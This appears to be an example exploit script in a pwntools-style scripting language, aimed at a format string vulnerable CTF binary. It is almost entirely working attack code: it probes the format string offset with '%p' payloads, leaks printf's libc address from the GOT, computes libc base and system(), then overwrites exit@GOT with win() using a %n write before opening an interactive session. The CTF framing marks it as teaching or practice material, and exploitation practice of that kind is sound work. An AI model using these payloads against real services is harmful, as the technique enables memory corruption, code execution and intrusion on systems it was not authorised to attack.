# Advanced format string exploitation
# Leak addresses, calculate base, arbitrary write to GOT

let binary = "./format_string_vuln"  # Compile from format_string_vuln.c in examples/
let host = "pwn.chal.ctf"            # Replace with actual CTF target
let port = 31337

# Analyze binary
let elf = analyze(binary)
let got_printf = elf["got"]["printf"]
let got_exit = elf["got"]["exit"]
let win_func = elf["symbols"]["win"]

print("[*] Target GOT entries:")
print("    printf@GOT:", hex(got_printf))
print("    exit@GOT:", hex(got_exit))
print("    win():", hex(win_func))

# Connect to target
let conn = connect(host, port)

# Step 1: Find format string offset
# Send test payload: AAAA.%p.%p.%p...
let test_payload = "AAAA" + ".%p" * 10
send(conn, test_payload)
let response = recv_until(conn, "\n")

# Parse response to find AAAA (0x41414141)
# In real exploit, automate this or manually check
let fmt_offset = 6  # Position where our input appears

print("[+] Format string offset:", fmt_offset)

# Step 2: Leak libc address using format string
# Read from GOT to leak libc function
let leak_payload = "%{}$s".format(fmt_offset) + p64(got_printf)
send(conn, leak_payload)
let leaked_data = recv(conn, 8)
let printf_addr = u64(leaked_data)

print("[+] Leaked printf@libc:", hex(printf_addr))

# Calculate libc base dynamically using Libc object
let libc_template = Libc("ubuntu20.04")
let printf_offset = libc_template["symbols"]["printf"]
let libc_base = printf_addr - printf_offset

# Create resolved Libc object with known base
let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let system = libc_resolved["symbols"]["system"]
print("[+] Libc base:", hex(libc_base))
print("[+] system():", hex(system))

# Step 3: Arbitrary write - overwrite exit@GOT with win()
# Using %n format specifier to write to memory
let writes = fmtstr_payload(fmt_offset, {got_exit: win_func})
send(conn, writes)

print("[+] Overwrote exit@GOT with win() - triggering...")

# Trigger exit() call which now points to win()
send(conn, "exit")

interactive(conn)
